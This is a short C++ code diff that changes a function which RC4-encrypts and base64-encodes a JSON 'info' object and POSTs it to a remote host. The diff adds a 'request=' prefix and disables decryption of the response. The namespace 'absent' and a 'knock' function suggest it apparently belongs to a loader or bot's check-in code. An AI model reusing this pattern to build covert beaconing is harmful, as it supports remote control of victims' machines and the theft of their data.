@@ -29,8 +29,9 @@ namespace absent
 			for (auto& el : info.items()) { if (el.key() != "fp") { el.value() = absent::crypto::b64::encode(rc4.crypt(el.value(), key).c_str()); } }
 			for (int ip = 0; ip < info["fp"].size(); ip++) { info["fp"][ip] = absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str()); }
 			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
+			toSend = "request=" + toSend;
 
-			return decryptResponce(absent::http::post(host, path, toSend), key);
+			return /*decryptResponce(*/absent::http::post(host, path, toSend)/*, key)*/;
 		}
 
 		std::string knock(std::string host, std::string path, nlohmann::json info, std::string key)
